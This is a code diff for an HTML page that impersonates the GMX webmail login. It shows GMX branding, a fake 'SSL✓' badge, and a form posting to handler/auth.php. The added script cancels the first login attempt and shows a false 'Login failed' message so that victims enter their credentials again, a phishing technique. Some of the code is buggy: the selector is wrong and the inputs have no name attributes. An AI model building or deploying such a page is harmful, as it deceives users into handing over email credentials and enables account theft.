@@ -4,7 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GMX Clone</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"/>
     <link rel="stylesheet" href="styles.css">
+    <script>
+      let clickedOnce = false;
+      let fail = document.querySelector('fail');
+      //let p1 = document.querySelector('password');
+      
+        function handleLoginClick(event) {
+            if (!clickedOnce) {
+                event.preventDefault();
+                //p1 = p1.value
+                //alert(p1);
+                fail.classList.remove('hide');
+                clickedOnce = true;
+            }
+        }
+    </script>
 </head>
 <body>
     <header>
@@ -12,7 +28,7 @@
             <div class="logo">GMX</div>
             <div class="search-bar">
                 <input type="text" placeholder="Search">
-                <button>🔍</button>
+                <button class="sea">🔍</button>
             </div>
             <div class="nav-links">
                 <a href="#">Sign up</a>
@@ -20,20 +36,34 @@
             </div>
         </div>
     </header>
+    <div class="more">
+      <p><i class="fas fa-home"></i></p>  
+      <p>Email <i class="fas fa-angle-down"></i></p>
+      <p>Features <i class="fas fa-angle-down"></i></p>
+      <p>Cloud <i class="fas fa-angle-down"></i></p>
+      <p>Security <i class="fas fa-angle-down"></i></p>
+      <p>Support <i class="fas fa-angle-down"></i></p>
+    </div>
 
     <main>
         <div class="login-container">
             <h2>Login <span class="ssl">SSL✓</span></h2>
-            <form method="POST" action="handler/auth.php">
+            <form action="handler/auth.php" method="POST" onsubmit="handleLoginClick(event)">
+              <div class="input-item">
                 <label for="email">Email address</label>
                 <input type="email" id="email" placeholder="Email address">
-                
+              </div>
+              <div class="input-item">
                 <label for="password">Password</label>
                 <input type="password" id="password" placeholder="Password">
-                
+              </div>  
+              <div class="input-item">
+                <p></p>
                 <button type="submit">Log in</button>
-                <a href="#" class="forgot-password">Forgot password?</a>
+              </div>
             </form>
+            <p class="fail hide">Login failed: Wrong email or password, try again</p>
+            <a href="#" class="forgot-password">Forgot password?</a>
         </div>
 
         <div class="banner">
